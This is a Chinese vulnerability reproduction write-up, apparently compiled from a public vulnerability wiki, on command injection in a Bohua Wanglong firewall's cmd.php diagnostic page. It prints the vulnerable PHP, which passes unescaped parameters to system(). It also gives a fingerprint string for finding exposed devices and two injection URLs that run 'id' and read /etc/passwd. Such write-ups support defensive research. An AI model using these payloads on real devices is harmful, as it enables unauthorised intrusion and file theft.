---
title: "博华网龙防火墙 cmd.php 远程命令执行漏洞"
date: 2026-10-18 09:15:52
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "博华网龙防火墙"
tags:
  - "博华网龙防火墙"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

博华网龙防火墙 cmd.php 过滤不足，导致命令拼接执行远程命令

## 漏洞影响

```
博华网龙防火墙
```

## 网络测绘

```
"博华网龙防火墙"
```

## 漏洞复现

登录页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162249275.png)

存在漏洞的文件为 **/diagnostics/cmd.php**

```php
<?php
    include_once("pub/pub.inc");
    include_once("pub/session.inc");
    
    $username = $_SESSION["USER_NAME"];
    checkApproachUrl(); 
    
  if($_GET['action'] == "ping")
  {
        $host = $_GET['host'];
        $count = $_GET['count'];
        system("/bin/ping -c $count " . escapeshellarg($host)." >temp.htm");
        
         if($username)
            pSyslog("ping $host $count次", 0);           
  }
  else if($_GET['action'] == "traceroute")
  {
        $host = $_GET['host'];
        $ttl =  $_GET['ttl'];
        $useicmp = $_GET['useicmp'];
        
        if($useicmp)
            $useicmp = "-I";
        else
            $useicmp = "";        
        system("/usr/bin/traceroute -d $useicmp -w 2 -m " . escapeshellarg($ttl) . " " . escapeshellarg($host)." >temp.htm");    
        if($username)
            pSyslog("traceroute $host 跳数为$ttl", 0);     
  }
  else if($_GET['action'] == "arping")
  {
    $host = $_GET['host'];
    $count = $_GET['count'];
    $if = $_GET['ifName'];
    $src = $_GET['src'];
    system("/usr/bin/arping -I $if -c $count -s $src $host >temp.htm");
    
     if($username)
        pSyslog("arping $host $count次", 0);
  }
  else
  {
    system("echo \"\" >temp.htm");
  } 
?>
```

可以发现其中存在多个命令执行点，均可进行命令拼接执行恶意命令

构造命令执行

```php
/diagnostics/cmd.php?action=ping&count=||id||
/diagnostics/cmd.php?action=arping&ifName=|cat /etc/passwd||
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162249153.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%8D%9A%E5%8D%8E%E7%BD%91%E9%BE%99%E9%98%B2%E7%81%AB%E5%A2%99-cmd.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
